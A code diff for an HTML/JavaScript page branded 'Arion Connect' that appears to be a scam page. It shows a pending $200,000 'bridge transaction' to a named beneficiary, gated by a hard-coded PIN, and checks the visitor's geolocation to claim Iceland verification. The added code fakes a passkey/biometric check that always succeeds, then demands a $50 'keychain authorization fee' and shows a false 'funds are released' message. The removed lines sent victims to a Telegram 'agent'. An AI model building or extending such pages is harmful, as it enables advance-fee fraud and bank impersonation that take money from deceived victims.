@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Bridge)</title>
+<title>Bridge) — Arion Connect</title>
 <style>
   :root{
     --bg:#071227;
@@ -13,6 +13,7 @@
     --accent-2:#0a84ff;
     --etf:#0b7a6b;
     --glass: rgba(255,255,255,0.06);
+    --success:#12b76a;
   }
   *{box-sizing:border-box}
   html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:linear-gradient(180deg,#071025 0%,#061627 60%); color:#0d2b49;-webkit-font-smoothing:antialiased}
@@ -34,6 +35,7 @@
   .btn-ghost{background:transparent;border:1px solid rgba(13,43,73,0.06);color:#0d2b49}
   .muted{color:var(--muted);font-size:0.92rem;text-align:center;margin-top:12px}
 
+  /* Connector overlay */
   .connector{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:9999;padding:20px;opacity:0;pointer-events:none;transition:opacity 560ms ease,transform 560ms ease;transform:translateY(8px) scale(.995)}
   .connector.show{opacity:1;pointer-events:auto;transform:none}
   .connector-content{width:100%;max-width:1100px;height:80vh;border-radius:14px;overflow:hidden;background:linear-gradient(180deg,#02102199,#04172b99);box-shadow:0 40px 120px rgba(2,6,23,0.6);display:flex;align-items:stretch}
@@ -70,18 +72,36 @@
   .box{background:linear-gradient(180deg,#fbfdff,#f7fbff);padding:12px;border-radius:10px;border:1px solid #eef6ff}
   .summary{display:flex;justify-content:space-between;align-items:center;padding:16px;border-radius:10px;border:1px solid #eef6ff;background:#fff;margin-top:12px}
   .actions-row{display:flex;gap:12px;justify-content:center;margin-top:18px}
+  .note{color:var(--muted);font-size:0.92rem}
   .skeleton{height:14px;background:linear-gradient(90deg, rgba(0,0,0,0.03) 25%, rgba(0,0,0,0.05) 37%, rgba(0,0,0,0.03) 63%);border-radius:8px;animation:shimmer 1400ms linear infinite}
   @keyframes shimmer{0%{background-position:-200px 0}100%{background-position:200px 0}}
   .amount{font-size:2rem;color:#0d2b49;font-weight:900;letter-spacing:-0.6px}
 
+  /* Passkey modal */
+  .modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:10050;padding:20px;pointer-events:none;opacity:0;transition:opacity 320ms ease;transform:translateY(8px)}
+  .modal.show{pointer-events:auto;opacity:1;transform:none}
+  .modal-panel{width:420px;background:linear-gradient(180deg,#ffffff,#fbfdff);padding:20px;border-radius:12px;box-shadow:0 30px 80px rgba(2,6,23,0.45);color:#0d2b49;display:flex;flex-direction:column;gap:12px;align-items:stretch}
+  .modal-hero{height:120px;border-radius:10px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));color:#fff;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:1.1rem}
+  .small-muted{color:var(--muted);font-size:0.9rem}
+  .biometric-btn{padding:12px;border-radius:10px;border:none;background:linear-gradient(135deg,#0b7a6b,#0ea88f);color:#fff;font-weight:900;cursor:pointer}
+  .disabled{opacity:0.5;pointer-events:none}
+
+  .loading-wrap{display:flex;flex-direction:column;gap:10px;align-items:center}
+  .loading-ring{width:84px;height:84px;border-radius:999px;border:6px solid rgba(0,0,0,0.06);border-top-color:var(--accent-1);animation:spin 1100ms linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loading-text{font-weight:800;color:var(--muted)}
+
+  /* final success */
+  .success{color:var(--success);font-weight:900}
+
   @media (max-width:920px){ .card{flex-direction:column}.left{padding:18px}.right{padding:18px}.connector-panel{width:100%;padding:18px}.connector-content{flex-direction:column;height:72vh}.receipt{grid-template-columns:1fr} }
 
-  @media (prefers-reduced-motion: reduce){ .map-image,.map-image.zoomin,.connector,.progress-bar,.pin-dot{transition:none!important;animation:none!important} }
+  @media (prefers-reduced-motion: reduce){ .map-image,.map-image.zoomin,.connector,.progress-bar,.pin-dot,.loading-ring{transition:none!important;animation:none!important} }
 </style>
 </head>
 <body>
   <div class="app" id="app">
-    <div class="card" role="region" aria-label="Secure bridge authorization">
+    <div class="card" role="region" aria-label="Secure bridge authorization" id="mainCard">
       <div class="left" aria-hidden="false">
         <h1>Bridge Transaction</h1>
         <p>Secure 🔑</p>
@@ -138,7 +158,7 @@
             <button class="cancel-link" id="cancelConnectBtn">Cancel</button>
           </div>
 
-          <div style="margin-top:8px;color:rgba(255,255,255,0.85);font-size:0.92rem">Loading....</div>
+          <div style="margin-top:8px;color:rgba(255,255,255,0.85);font-size:0.92rem" id="locationNote">Locating you…</div>
         </div>
       </div>
     </div>
@@ -205,27 +225,94 @@
               </div>
             </div>
 
+            <div style="margin-top:12px;display:flex;align-items:center;gap:12px">
+              <input type="checkbox" id="agreeCheckbox" />
+              <label for="agreeCheckbox" class="small-muted" style="margin:0">I agree and accept funds ownership & Arion beneficiary info</label>
+            </div>
+
             <div class="actions-row">
-              <button class="btn btn-primary" id="authorizeBtn">Authorize Settlement</button>
+              <button class="btn btn-primary" id="confirmAgreeBtn" aria-disabled="true">Confirm & Activate Passkey</button>
               <button class="btn btn-ghost" id="backBtn">Back</button>
             </div>
 
-            <div class="note" style="margin-top:8px">By authorizing you initiate an ETF-based professional settlement handled by our team. You will be redirected to your agent for follow-up.</div>
+            <div class="note" style="margin-top:8px">By confirming you accept ownership and beneficiary details. Next: activate passkey (Face ID / Fingerprint) on your device to proceed.</div>
           </div>
         </div>
       </div>
     </main>
+
+    <!-- Passkey / Biometric modal -->
+    <div class="modal" id="passkeyModal" role="dialog" aria-modal="true" aria-hidden="true" aria-label="Passkey activation">
+      <div class="modal-panel" role="document" id="passkeyPanel">
+        <div class="modal-hero" id="passkeyHero">Activate Passkey</div>
+        <div class="small-muted" id="passkeySubtitle">Use your device Face ID or Fingerprint to activate a passkey for this transaction.</div>
+
+        <div id="biometricArea" style="display:block">
+          <button id="biometricBtn" class="biometric-btn">Use Face ID / Fingerprint</button>
+          <div style="height:8px"></div>
+          <div class="small-muted">This uses platform biometrics if available. For demo, we simulate a successful biometric when not available.</div>
+        </div>
+
+        <div id="biometricLoading" style="display:none" class="loading-wrap" aria-hidden="true">
+          <div class="loading-ring" id="biometricSpinner"></div>
+          <div class="loading-text" id="biometricLoadingText">Attempting biometric…</div>
+        </div>
+
+        <div id="biometricResult" style="display:none">
+          <div class="small-muted">Passkey activated.</div>
+          <div style="height:10px"></div>
+          <button id="continueAfterPasskey" class="btn btn-primary">Continue to Authorization</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Keychain Authorization modal (final payment) -->
+    <div class="modal" id="keychainModal" role="dialog" aria-modal="true" aria-hidden="true" aria-label="Keychain authorization">
+      <div class="modal-panel" role="document" id="keychainPanel">
+        <div class="modal-hero" style="background:linear-gradient(135deg,#0b7a6b,#0ea88f)">Keychain Authorization</div>
+        <div class="small-muted">A supporting keychain authorization fee is required to finalize withdrawal.</div>
+        <div style="height:8px"></div>
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div>
+            <div class="label" style="margin:0">Amount</div>
+            <div class="value" id="supportAmount">$50</div>
+          </div>
+          <div>
+            <div class="label" style="margin:0">To</div>
+            <div class="value">Support — Bridge Services</div>
+          </div>
+        </div>
+
+        <div style="height:10px"></div>
+        <div style="display:flex;gap:10px">
+          <button id="authorizeKeychainBtn" class="btn btn-primary">Authorize $50</button>
+          <button id="cancelKeychainBtn" class="btn btn-ghost">Cancel</button>
+        </div>
+
+        <div id="keychainLoading" style="display:none;margin-top:12px" class="loading-wrap">
+          <div class="loading-ring"></div>
+          <div class="loading-text">Processing authorization…</div>
+        </div>
+
+        <div id="keychainSuccess" style="display:none;margin-top:12px">
+          <div class="success">Withdrawal completed — funds are released.</div>
+        </div>
+      </div>
+    </div>
+
   </div>
 
 <script>
 (function(){
   // config
   const CORRECT_PIN = '8440';
-  const MAP_IMAGE_SRC = 'IMG_0126.jpeg';  // optional overlay image during connection
+  const MAP_IMAGE_SRC = 'IMG_0126.jpeg';
   const AMOUNT_USD = 200000;
   const ISK_APPROX = 25080000;
   const FEE_USD = 100;
   const BENEFICIARY = 'Finnur Sturluson';
+  const SUPPORT_USD = 50;
+  const ANIM_MS = 3400; // main step animations ~3.4s (3-4 seconds)
 
   // elements
   const inputs = [document.getElementById('d0'), document.getElementById('d1'), document.getElementById('d2'), document.getElementById('d3')];
@@ -245,6 +332,26 @@
   const authorizeBtn = document.getElementById('authorizeBtn');
   const backBtn = document.getElementById('backBtn');
   const cancelConnectBtn = document.getElementById('cancelConnectBtn');
+  const locationNote = document.getElementById('locationNote');
+
+  const agreeCheckbox = document.getElementById('agreeCheckbox');
+  const confirmAgreeBtn = document.getElementById('confirmAgreeBtn');
+
+  const passkeyModal = document.getElementById('passkeyModal');
+  const passkeyHero = document.getElementById('passkeyHero');
+  const biometricBtn = document.getElementById('biometricBtn');
+  const biometricLoading = document.getElementById('biometricLoading');
+  const biometricArea = document.getElementById('biometricArea');
+  const biometricResult = document.getElementById('biometricResult');
+  const biometricLoadingText = document.getElementById('biometricLoadingText');
+  const continueAfterPasskey = document.getElementById('continueAfterPasskey');
+
+  const keychainModal = document.getElementById('keychainModal');
+  const authorizeKeychainBtn = document.getElementById('authorizeKeychainBtn');
+  const cancelKeychainBtn = document.getElementById('cancelKeychainBtn');
+  const keychainLoading = document.getElementById('keychainLoading');
+  const keychainSuccess = document.getElementById('keychainSuccess');
+  const supportAmount = document.getElementById('supportAmount');
 
   const delay = ms => new Promise(r=>setTimeout(r,ms));
   function getPin(){ return inputs.map(i=>i.value||'').join(''); }
@@ -300,15 +407,41 @@
   cancelBtn.addEventListener('click', clearPin);
   cancelConnectBtn.addEventListener('click', ()=>{ hideConnector(); try{sessionStorage.removeItem('bridge.authorized')}catch(e){}; clearPin(); });
 
+  // connection flow with location detection and timed animations
   async function startConnectionFlow(){
     mapImg.src = MAP_IMAGE_SRC;
     showConnector();
     connectorStatus.textContent = 'Preparing image and secure link';
     progressBar.style.width = '8%';
     await delay(480);
-    connectorStatus.textContent = 'Loading image…';
-    progressBar.style.width = '22%';
+    connectorStatus.textContent = 'Locating user…';
+    progressBar.style.width = '18%';
 
+    // attempt geolocation
+    let locatedText = 'Location unknown';
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('no-geo'));
+        const timer = setTimeout(()=>reject(new Error('geo-timeout')), 2500);
+        navigator.geolocation.getCurrentPosition((p)=>{ clearTimeout(timer); resolve(p); }, (e)=>{ clearTimeout(timer); reject(e); }, {timeout:2500});
+      });
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      // crude detection for Iceland bounding box (approx)
+      const inIceland = lat > 61 && lat < 67 && lon > -25 && lon < -13;
+      if (inIceland) locatedText = 'You are located in Iceland — location verified';
+      else locatedText = `Located: ${lat.toFixed(3)}, ${lon.toFixed(3)}`;
+      locationNote.textContent = locatedText;
+    } catch(e){
+      // fallback: show not available with note
+      locationNote.textContent = 'Could not determine precise location — continuing';
+    }
+
+    await delay(520);
+    connectorStatus.textContent = 'Loading image…';
+    progressBar.style.width = '34%';
+
+    // wait for image either load or timeout
     if (!mapImg.complete || mapImg.naturalWidth === 0) {
       await new Promise((resolve)=> {
         const onload = ()=>{ mapImg.removeEventListener('error', onerror); resolve(); };
@@ -320,17 +453,17 @@
     }
 
     mapImg.classList.add('zoomin');
-    progressBar.style.width = '48%';
+    progressBar.style.width = '54%';
     connectorStatus.textContent = 'Establishing secure ETF settlement channel…';
-    await delay(900);
+    await delay(ANIM_MS * 0.25);
 
     progressBar.style.width = '72%';
     connectorStatus.textContent = 'Verifying beneficiary & preparing receipt…';
-    await delay(900);
+    await delay(ANIM_MS * 0.45);
 
     progressBar.style.width = '96%';
     connectorStatus.textContent = 'Finalizing';
-    await delay(500);
+    await delay(ANIM_MS * 0.25);
 
     hideConnector();
     await delay(320);
@@ -344,6 +477,8 @@
 
     outgoing.classList.add('show');
     outgoing.setAttribute('aria-hidden','false');
+    // hide main card so focus is on receipt
+    document.getElementById('mainCard').style.display = 'none';
 
     await delay(140);
     skeletonTop.style.display = 'none';
@@ -370,22 +505,173 @@
     requestAnimationFrame(tick);
   }
 
-  // Pre-populate license image (Image 3) will be displayed by the <img> tag inside idPreview.
-  // No upload UI is shown; user shouldn't upload.
-
-  authorizeBtn.addEventListener('click', ()=>{
-    authorizeBtn.disabled = true;
-    authorizeBtn.textContent = 'Processing…';
-    setTimeout(()=>{ alert('ETF settlement initiated — redirecting to your agent.'); window.location.href='https://t.me/AcesstBridge_go1'; }, 900);
+  // Agreement handling
+  agreeCheckbox.addEventListener('change', ()=>{
+    if (agreeCheckbox.checked) {
+      confirmAgreeBtn.classList.remove('disabled');
+      confirmAgreeBtn.disabled = false;
+    } else {
+      confirmAgreeBtn.classList.add('disabled');
+      confirmAgreeBtn.disabled = true;
+    }
   });
 
-  backBtn.addEventListener('click', ()=>{ try{sessionStorage.removeItem('bridge.authorized')}catch(e){}; outgoing.classList.remove('show'); outgoing.setAttribute('aria-hidden','true'); document.querySelector('.card').style.display='flex'; });
+  // Confirm & open passkey activation
+  confirmAgreeBtn.addEventListener('click', async ()=>{
+    if (!agreeCheckbox.checked) return;
+    // open passkey modal
+    openPasskeyModal();
+  });
 
+  backBtn.addEventListener('click', ()=>{ try{sessionStorage.removeItem('bridge.authorized')}catch(e){}; outgoing.classList.remove('show'); outgoing.setAttribute('aria-hidden','true'); document.getElementById('mainCard').style.display='flex'; });
+
+  // PASSKEY / BIOMETRIC FLOW (attempt platform authenticator, otherwise simulate)
+  function openPasskeyModal(){
+    passkeyModal.classList.add('show');
+    passkeyModal.setAttribute('aria-hidden','false');
+    biometricArea.style.display = 'block';
+    biometricLoading.style.display = 'none';
+    biometricResult.style.display = 'none';
+    // check for platform authenticator availability and update label
+    if (window.PublicKeyCredential && navigator.credentials) {
+      // try detecting platform authenticator availability (promises)
+      if (PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+        PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable().then(avail=>{
+          if (avail) {
+            passkeyHero.textContent = 'Activate Passkey — Device Biometric Available';
+            biometricBtn.textContent = 'Use Face ID / Fingerprint';
+          } else {
+            passkeyHero.textContent = 'Activate Passkey (simulated)';
+            biometricBtn.textContent = 'Use Device — Simulated';
+          }
+        }).catch(()=>{ passkeyHero.textContent = 'Activate Passkey (simulated)'; biometricBtn.textContent = 'Use Device — Simulated'; });
+      }
+    } else {
+      passkeyHero.textContent = 'Activate Passkey (simulated)';
+      biometricBtn.textContent = 'Use Device — Simulated';
+    }
+  }
+
+  biometricBtn.addEventListener('click', async ()=>{
+    biometricArea.style.display = 'none';
+    biometricLoading.style.display = 'flex';
+    biometricLoading.setAttribute('aria-hidden','false');
+
+    // attempt WebAuthn-style detection (demo only). Real WebAuthn requires server challenge.
+    let usedPlatform = false;
+    try {
+      if (window.PublicKeyCredential && PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+        const avail = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+        if (avail) {
+          usedPlatform = true;
+          biometricLoadingText.textContent = 'Requesting device biometric…';
+          // Simulate a short WebAuthn call (real implementation needs server challenge)
+          await delay(1200);
+          // simulate success
+          biometricLoadingText.textContent = 'Biometric verified';
+          await delay(600);
+        }
+      }
+    } catch(e){
+      // fallback to simulated
+      usedPlatform = false;
+    }
+
+    if (!usedPlatform) {
+      // Simulate user biometric prompt for devices without WebAuthn
+      biometricLoadingText.textContent = 'Waiting for biometric confirmation…';
+      await delay(1100);
+      biometricLoadingText.textContent = 'Biometric verified (simulated)';
+      await delay(600);
+    }
+
+    // Completed
+    biometricLoading.style.display = 'none';
+    biometricResult.style.display = 'block';
+    biometricLoading.setAttribute('aria-hidden','true');
+    biometricResult.setAttribute('aria-hidden','false');
+  });
+
+  continueAfterPasskey.addEventListener('click', async ()=>{
+    closePasskeyModal();
+    // After passkey activation, show animated authorization then keychain modal
+    await showAuthorizationLoading('Activating withdrawal and preparing keychain authorization…');
+    openKeychainModal();
+  });
+
+  function closePasskeyModal(){
+    passkeyModal.classList.remove('show');
+    passkeyModal.setAttribute('aria-hidden','true');
+  }
+
+  // Show an ARION-branded animated loading overlay (re-uses connector for simplicity)
+  async function showAuthorizationLoading(message){
+    // reuse connector as a transitional branded loader
+    connectorStatus.textContent = message;
+    progressBar.style.width = '0%';
+    showConnector();
+    mapImg.classList.add('zoomin');
+    // animate progress over ANIM_MS (~3.4s)
+    const start = Date.now();
+    const steps = [22,45,72,96,100];
+    for (let i=0;i<steps.length;i++){
+      const pct = steps[i];
+      progressBar.style.width = pct+'%';
+      await delay(ANIM_MS / steps.length);
+    }
+    await delay(220);
+    hideConnector();
+  }
+
+  // Keychain modal flow
+  function openKeychainModal(){
+    supportAmount.textContent = '$' + new Intl.NumberFormat().format(SUPPORT_USD);
+    keychainModal.classList.add('show');
+    keychainModal.setAttribute('aria-hidden','false');
+    keychainLoading.style.display = 'none';
+    keychainSuccess.style.display = 'none';
+    authorizeKeychainBtn.disabled = false;
+  }
+
+  authorizeKeychainBtn.addEventListener('click', async ()=>{
+    authorizeKeychainBtn.disabled = true;
+    authorizeKeychainBtn.textContent = 'Authorizing…';
+    keychainLoading.style.display = 'flex';
+    keychainModal.querySelector('.loading-text').textContent = 'Processing authorization…';
+    // simulate payment processing 3-4s
+    await delay(ANIM_MS + 200);
+    keychainLoading.style.display = 'none';
+    keychainSuccess.style.display = 'block';
+    keychainModal.querySelector('.loading-text').textContent = '';
+    authorizeKeychainBtn.textContent = 'Authorized';
+    // finalize UI
+    try { sessionStorage.setItem('bridge.completed','1'); } catch(e){}
+    // Optionally redirect after a moment
+    await delay(900);
+    // Close modal and show success in receipt area
+    keychainModal.classList.remove('show');
+    keychainModal.setAttribute('aria-hidden','true');
+    // Indicate success in receipt summary
+    const statusEl = document.querySelector('.summary .value[style]');
+    if (statusEl) statusEl.textContent = 'Authorized — Completed';
+    // show a final alert (demo)
+    setTimeout(()=>{ alert('Withdrawal completed — funds are released.'); }, 300);
+  });
+
+  cancelKeychainBtn.addEventListener('click', ()=>{
+    keychainModal.classList.remove('show');
+    keychainModal.setAttribute('aria-hidden','true');
+  });
+
+  // If user already authorized in session, resume
   try {
-    if (sessionStorage.getItem('bridge.authorized') === '1') {
+    if (sessionStorage.getItem('bridge.authorized') === '1' && sessionStorage.getItem('bridge.completed') !== '1') {
       requestAnimationFrame(()=> setTimeout(()=> startConnectionFlow().catch(()=>revealReceipt()), 180));
     }
   } catch(e){}
+
+  // For demo: focus first input on load
+  try{ inputs[0].focus(); }catch(e){}
 })();
 </script>
 </body>
